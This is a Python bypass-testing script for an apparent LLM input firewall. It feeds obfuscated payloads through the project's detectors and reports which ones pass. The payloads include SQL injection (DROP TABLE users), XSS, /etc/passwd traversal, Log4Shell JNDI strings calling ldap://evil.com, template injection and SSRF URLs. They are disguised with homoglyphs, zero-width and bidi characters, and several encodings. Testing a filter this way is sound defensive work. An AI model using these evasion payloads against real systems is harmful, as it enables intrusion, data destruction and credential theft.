#!/usr/bin/env python3
"""
BREAK THE SYSTEM - AGGRESSIVE BYPASS TESTING
Kombiniere ALLE Techniken um Bypasses zu finden
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import base64

from llm_firewall.detectors.attack_patterns import scan_attack_patterns
from llm_firewall.policy.risk_weights_v2_otb import decide_action_otb
from llm_firewall.preprocess.context import classify_context
from tests_firewall.test_ultra_break_v4_dos import run_detectors_timed

# AGGRESSIVE BYPASS ATTEMPTS
attacks = [
    # 1. Case variations
    ("case1", "dRoP tAbLe users"),
    ("case2", "DrOp TaBlE users--"),
    # 2. Unicode whitespace
    ("ws1", "DROP\u00a0TABLE\u00a0users"),
    ("ws2", "DROP\u2003TABLE\u2003users"),
    # 3. Mixed encoding
    ("enc1", "DROP " + base64.b64encode(b"TABLE").decode() + " users"),
    ("enc2", base64.b64encode(b"DROP").decode() + " TABLE users"),
    # 4. Comment splitting
    ("split1", "DROP/**/TABLE/**/users"),
    ("split2", "DROP//\nTABLE//\nusers"),
    # 5. String concat
    ("concat1", "java" + "script:alert(1)"),
    ("concat2", ".<./.<./etc/passwd"),
    # 6. Hex encoding
    ("hex1", "\\x44\\x52\\x4f\\x50 TABLE users"),  # DROP in hex
    ("hex2", "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e"),  # <script> in hex
    # 7. URL encoding
    ("url1", "%64%72%6f%70%20table%20users"),  # drop table users
    ("url2", "%3c%73%63%72%69%70%74%3e"),  # <script>
    # 8. Double encoding
    ("dbl1", "%2564%2572%256f%2570"),  # double encoded "drop"
    # 9. Unicode escapes
    ("uni1", "\\u0044\\u0052\\u004f\\u0050 TABLE"),  # DROP
    ("uni2", "\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e"),  # <script>
    # 10. Fullwidth characters
    ("full1", "\uff24\uff32\uff2f\uff30 TABLE users"),  # DROP in fullwidth
    ("full2", "\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e"),  # <script> fullwidth
    # 11. Homoglyphs BRUTAL
    ("homo1", "\u0044\u0280\u041e\u0420 TABLE users"),  # DROP with cyrillic
    ("homo2", "j\u0430v\u0430script:alert(1)"),  # javascript with cyrillic a
    # 12. Zalgo text
    ("zalgo1", "D\u0336R\u0336O\u0336P\u0336 TABLE users"),
    ("zalgo2", "<\u0336s\u0336c\u0336r\u0336i\u0336p\u0336t\u0336>"),
    # 13. Bidi tricks
    ("bidi1", "\u202eDROP TABLE users"),
    ("bidi2", "DROP\u202e TABLE users"),
    # 14. Zero-width tricks
    ("zw1", "D\u200bR\u200bO\u200bP TABLE users"),
    ("zw2", "java\u200bscript:alert(1)"),
    # 15. Alternative syntax
    ("alt1", "EXEC('DROP TABLE users')"),
    ("alt2", "eval(atob('ZHJvcCB0YWJsZQ=='))"),  # drop table in base64
    # 16. Obfuscated paths
    ("path1", "/etc/../etc/passwd"),
    ("path2", "....//....//etc/passwd"),
    ("path3", "etc/passwd" + "\x00" + ".jpg"),  # null byte
    # 17. JNDI variations
    ("jndi1", "${jn" + "di:ldap://evil.com}"),
    ("jndi2", "$\\{jndi:ldap://evil.com\\}"),
    ("jndi3", "${${lower:j}ndi:ldap://evil.com}"),
    ("jndi4", "${jndi:${lower:l}dap://evil.com}"),
    # 18. Template injections obfuscated
    ("tmpl1", "{" + "{7*7}" + "}"),
    ("tmpl2", "<" + "%= 7*7 %" + ">"),
    # 19. Combined obfuscation
    ("combo1", base64.b64encode(b"DROP TABLE").decode() + " users--"),
    ("combo2", "\u202e" + base64.b64encode(b"<script>").decode()),
    ("combo3", "java\u200bscript:" + base64.b64encode(b"alert(1)").decode()),
    # 20. Polyglot attacks
    ("poly1", "'; DROP TABLE users; --"),
    ("poly2", "<svg onload=alert(1)>"),
    ("poly3", "${jndi:ldap://evil.com/a}"),
    # 21. Case + encoding
    ("case_enc1", base64.b64encode(b"dRoP tAbLe").decode()),
    ("case_enc2", "Dr" + base64.b64encode(b"OP").decode() + " TABLE"),
    # 22. Fragments across encoding
    ("frag1", "DR" + "\u200b" + "OP TABLE"),
    ("frag2", base64.b64encode(b"DRO").decode() + "P TABLE"),
    # 23. Alternative protocols
    ("proto1", "data:text/html,<script>alert(1)</script>"),
    ("proto2", "vbscript:msgbox(1)"),
    # 24. SSRF variations
    ("ssrf1", "http://127.0.0.1"),
    ("ssrf2", "http://0.0.0.0"),
    ("ssrf3", "http://[::1]"),
    ("ssrf4", "http://2130706433"),  # 127.0.0.1 in decimal
    # 25. NULL bytes
    ("null1", "DROP\x00 TABLE users"),
    ("null2", "../\x00/etc/passwd"),
]

print("=" * 70)
print("AGGRESSIVE SYSTEM BREAKING - FINDING BYPASSES")
print("=" * 70)

bypasses = []
total = 0

for category, payload in attacks:
    total += 1

    # Full detection
    base_hits, elapsed = run_detectors_timed(payload)
    attack_hits = scan_attack_patterns(payload)
    all_hits = list(base_hits) + attack_hits

    ctx = classify_context(payload)
    action, risk, contrib = decide_action_otb(all_hits, ctx, text=payload)

    if action == "PASS":
        bypasses.append(
            {
                "category": category,
                "payload": payload[:60],
                "risk": risk,
                "hits": all_hits,
                "context": ctx["context"],
            }
        )
        print(f"BYPASS FOUND: {category} - risk={risk:.3f}")

print("\n" + "=" * 70)
print("RESULTS:")
print("=" * 70)
print(f"Total Attacks:  {total}")
print(f"Bypasses Found: {len(bypasses)}")
print(f"ASR:            {len(bypasses) / total * 100:.1f}%")
print(f"Detection Rate: {(total - len(bypasses)) / total * 100:.1f}%")

if bypasses:
    print("\n" + "=" * 70)
    print("BYPASS DETAILS:")
    print("=" * 70)
    for bp in bypasses:
        print(f"\n{bp['category']}:")
        print(f"  Payload: {bp['payload']}")
        print(f"  Risk: {bp['risk']:.3f}")
        print(f"  Hits: {bp['hits']}")
        print(f"  Context: {bp['context']}")
else:
    print("\nNO BYPASSES FOUND! SYSTEM ROBUST!")
